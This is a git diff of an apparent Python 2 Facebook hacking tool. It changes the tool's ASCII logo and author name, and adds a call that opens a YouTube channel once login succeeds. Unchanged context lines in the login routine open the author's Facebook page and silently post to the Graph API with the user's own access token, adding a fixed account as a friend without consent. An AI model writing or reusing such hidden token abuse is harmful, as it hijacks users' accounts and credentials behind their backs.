@@ -48,14 +48,18 @@ def jalan(z):
 
 #### LOGO ####
 logo = """
-\033[0;39m╭━━━┳━━━┳━━━╮
-\033[0;39m┃╭━╮┃╭━━┫╭━╮┃
-\033[0;39m╰╯╭╯┃╰━━┫┃┃┃┃
-\033[0;39m╭╮╰╮┃╭━╮┃┃┃┃┃
-\033[0;39m┃╰━╯┃╰━╯┃╰━╯┃
-\033[0;39m╰━━━┻━━━┻━━━╯
+
+\033[0;45m______  _____  _   _ 
+\033[0;45m| ___ \/  __ \| | | |
+\033[0;45m| |_/ /| /  \/| |_| |
+\033[0;45m|  __/ | |    |  _  |
+\033[0;45m| |    | \__/\| | | |
+\033[0;45m\_|     \____/\_| |_/
+                     
+                     
+
 \033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
-\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|Hamza Ali & Kamran\033[0;31m║
+\033[0;39m║\033[0;39m* \033[0;36mAuthor  \033[1;36m : \033[1;31mTricker•|Hamza Ali & Kamran\033[0;31m║
 \033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://github.com/HamzaAliPch\033[0m \033[0;31m║
 \033[0;39m║\033[0;36m* \033[0;32mFacebook \033[1;32m: \033[1;32mhttps://www.facebook.com/itx.hamzi690\033[0;31m║
 \033[0;34m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
@@ -141,6 +145,7 @@ def login():
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
 				os.system('xdg-open https://www.facebook.com/itx.hamzi690')
+				os.system('xdg-open https://www.youtube.com/channel/UCR91xXkxJe9v92w8k7zMapw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
